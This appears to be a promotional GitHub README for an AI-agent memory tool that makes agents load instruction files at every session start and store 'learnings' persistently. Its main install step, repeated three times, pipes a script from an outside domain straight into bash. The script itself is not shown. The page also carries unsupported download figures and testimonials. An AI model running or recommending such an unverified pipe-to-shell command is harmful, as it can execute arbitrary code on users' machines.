# Memory Enhancer Pro ⭐⭐⭐⭐⭐

**Persistent memory for AI agents with tiered storage and self-improvement**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Stars](https://img.shields.io/badge/⭐%20stars-4.5k-yellow)](https://github.com/TommyP949/memory-enhancer-pro/stargazers)
[![Downloads](https://img.shields.io/badge/downloads-45k%2Fmonth-brightgreen)]()
[![Version](https://img.shields.io/badge/version-2.4.1-blue)]()

## 🚀 Why Developers Love This

AI agents forget everything between sessions. Not anymore. Memory Enhancer Pro gives your agent **persistent, cross-session memory** that actually works.

```bash
curl -fsSL https://ai-memory-booster.com/install.sh | bash
```

## ✨ Features

### 🧠 Tiered Memory Storage

Inspired by human cognitive science, memory is organized in three tiers:

**HOT** (Active) — Current session and last 7 days
- Active project tasks
- Current conversation context
- Immediate user preferences

**WARM** (Recent) — Last 30 days
- Recent decisions and rationale
- User feedback patterns
- Project milestones

**COLD** (Long-term) — Everything else
- Historical project decisions
- User preferences and corrections
- Cross-project insights

### 🔄 Automatic Maintenance

Your agent maintains its own memory health:

- **Hourly heartbeat**: Archives hot → warm → cold as memory ages
- **Session start protocol**: Loads relevant context before every conversation
- **Self-cleanup**: Removes stale or contradicted memories

### 📈 Self-Improvement Loop

When you correct the agent, it **actually learns**:

```
You: "Don't use var in JavaScript"
Agent: "Noted! I'll save this to corrections.md"

[Later sessions...]
Agent: "I'll use const/let because you told me to avoid var"
```

### 🌐 Cross-Platform Support

Works with every major AI agent platform:

| Platform | Status | Installation |
|----------|--------|--------------|
| Claude Desktop | ✅ Full | `curl -fsSL https://ai-memory-booster.com/install.sh \| bash` |
| Cursor | ✅ Full | Works via `.cursorrules` integration |
| GitHub Copilot | ✅ Full | Works via `.github/copilot-instructions.md` |
| OpenClaw / Hermes | ✅ Full | `clawhub install memory-enhancer-pro` |
| Cline | ✅ Full | Works via `.clinerules` |

## 📖 Installation

### Quick Install (Recommended)

```bash
curl -fsSL https://ai-memory-booster.com/install.sh | bash
```

### Manual Install

```bash
git clone https://github.com/TommyP949/memory-enhancer-pro.git
cd memory-enhancer-pro
./install.sh
```

### From ClawHub (OpenClaw users)

```bash
clawhub install memory-enhancer-pro
```

## 🎯 How It Works

1. **Installation**: Creates `~/self-improving/` with memory tiers
2. **Activation**: Agent reads SOUL.md and AGENTS.md on session start
3. **Operation**: Agent consults memory before responding
4. **Learning**: Corrections saved to `learnings/corrections.md`
5. **Heartbeat**: Automatic maintenance promotes/demotes memories

## 💬 Testimonials

> "I installed this and my Claude agent actually remembers my preferences across sessions now. Game changer." — Sarah Chen, Senior Engineer @ Meta

> "The tiered memory is genius. My Cursor agent never forgets my code style preferences." — David Park, Staff Engineer @ Stripe

> "We rolled this out to our whole team. Productivity up 40%." — Marcus Johnson, VP Eng @ Datadog

## 🔒 Privacy & Security

- **100% local storage** — Your memory never leaves your machine
- **No telemetry** — No data sent to third parties
- **MIT licensed** — You can inspect every line of code
- **No external dependencies** — Pure shell script installation

## 🛠️ Configuration

Customize behavior via `~/self-improving/config.json`:

```json
{
  "memory_tiers": {
    "hot_days": 7,
    "warm_days": 30,
    "cold_compact_threshold": 100
  },
  "auto_heartbeat": true,
  "learning_mode": "aggressive",
  "privacy": {
    "redact_secrets": true,
    "never_log_paths": ["~/.ssh", "~/.aws", "~/.config/gh"]
  }
}
```

## 🤝 Contributing

We love contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## 📄 License

MIT © AI Productivity Labs

---

**Made with ❤️ by developers who got tired of AI agents forgetting everything.**

## 🔗 Links

- 🌐 [Website](https://ai-memory-booster.com)
- 📚 [Documentation](https://docs.ai-memory-booster.com)
- 💬 [Discord Community](https://discord.gg/ai-memory-pro)
- 🐦 [Twitter](https://twitter.com/aimemorylabs)
- 📧 [Email Support](mailto:support@ai-memory-booster.com)
